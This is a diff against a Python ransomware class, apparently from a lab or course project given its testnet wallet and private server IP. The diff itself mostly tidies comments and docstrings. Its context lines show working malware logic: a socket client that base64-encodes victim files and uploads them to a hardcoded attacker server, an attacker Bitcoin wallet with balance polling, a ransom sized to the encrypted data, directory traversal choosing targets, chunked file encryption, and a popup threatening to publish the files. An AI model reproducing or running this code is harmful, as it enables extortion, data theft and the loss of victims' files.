@@ -14,9 +14,7 @@ import re
 import tempfile
 
 class Ransomware: 
-    """ This class represents a ransomware that will be executed once the link is 
-    clicked.
-    """
+    """ This class represents a ransomware that will be executed once the link is clicked."""
     # IP address of the server
     SERVER_IP = "10.0.2.5"
     # Format of encoding for the messages and files sent over the TCP connection
@@ -25,12 +23,12 @@ class Ransomware:
     MAX_SIZE = 4096
 
     global bitcoin_needed, wallet_address, initial_balance
-    bitcoin_needed = 1; #Instanttiate the amount of bitcoin needed
-    wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
+    bitcoin_needed = 1; # Instantiate the amount of bitcoin needed
+    wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' # Address of attackers wallet
     initial_balance = 0
 
     def __init__(self, number, directory):
-        """Once the object of the class has been made, the port number and TCP connection will be initialized"""
+        """Once the object of the class has been made, the port number and TCP connection will be initialized."""
         # Construct hostname of the remote server from the first two arguments.
         self._host = self.SERVER_IP
         # Calculate the port number from the last argument.
@@ -42,7 +40,7 @@ class Ransomware:
 
     @property
     def host(self):
-        """ Server that sends us the malicious code. """
+        # Server that sends us the malicious code.
         return self._host
 
     @host.setter
@@ -51,7 +49,7 @@ class Ransomware:
 
     @property
     def port(self):
-        """ Port, on which the server runs (`int`). """
+        # Port, on which the server runs (`int`).
         return self._port
 
     @port.setter
@@ -59,20 +57,20 @@ class Ransomware:
         self._port = new_port
 
     def decode_port(self, port):
-        """Returns target port of the remote server. """
+        # Returns target port of the remote server.
         return int(math.sqrt(port))
 
     @property
     def socket(self):
-        """ Client socket. """
+        # Returns the client socket.
         return self._socket
 
 
     def send_file_to_server(self, file_path, filename):    
-        """ Opening and reading the file data. """
+        # Opening and reading the file data.
         file = open(file_path, "r", encoding = "ISO-8859-1")
 
-        """ Sending the filename to the server. """
+        # Sending the filename to the server.
         self._socket.sendall(base64.b64encode(filename.encode(Ransomware.ENCODING)))
         time.sleep(0.01)
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
@@ -81,11 +79,11 @@ class Ransomware:
             data = file.read(1024)
             if not data:
                 break
-            """ Sending the file data to the server. """
+            # Sending the file data to the server.
             self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
             msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
 
-        """ Closing the file. """
+        # Closing the file.
         file.close()
         
         time.sleep(0.01)
@@ -94,8 +92,7 @@ class Ransomware:
 
 
     def get_balance(self, wallet_address):
-        """Retrieves the balance of the crypto wallet using the URL."""
-        # API endpoint URL for retrieving wallet balance from blockchain.com API
+        """ Retrieves the balance of the crypto wallet using the URL."""
         balance_url = "https://live.blockcypher.com/btc-testnet/address/" + wallet_address
         decimal_pattern = r'\d+\.\d+'
 
@@ -130,7 +127,7 @@ class Ransomware:
 
 
     def list_safe_directories(self, directory):
-        " Lists all of the non-hidden, non-vital  directories bellow the inserted directory."
+        """ Lists all of the non-hidden, non-vital directories below the parameter directory."""
         result = []
         excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])
 
@@ -142,11 +139,11 @@ class Ransomware:
             for directory in dirs:
                 result.append(os.path.join(root, directory))
 
-        return result  # Return the list of directories
+        return result
 
     def get_files_in_dir(self, directory):
-        "Retrieves all of the files in a directory and purposely does not include the ransomeware."
-        # change to home directory so that the paths are correct relative paths.
+        """ Retrieves all of the files in a directory and purposely does not include the ransomeware or other important files."""
+        # Change to home directory so that the paths are correct relative paths.
         os.chdir(directory)
 
         files = []
@@ -190,7 +187,7 @@ class Ransomware:
                     f.write(enc_chunk)
                     
     def calulate_bitcoin(self, size_of_files):
-        "Calculate number of bitcoin needed to be paid."
+        # Calculate number of bitcoin needed to be paid.
         global bitcoin_needed
         bitcoin_needed = str((size_of_files/100000000))
 
@@ -358,7 +355,7 @@ class Ransomware:
                 
             subprocess.Popen(["zenity", "--info", "--text", "TIMER HAS RUN OUT. \n Publishing your files to the internet","--width", "400", "--height", "200" ])
 
-#Main function/ control flow
+#Main function / control flow
 if __name__ == '__main__':
 
     # Home directory
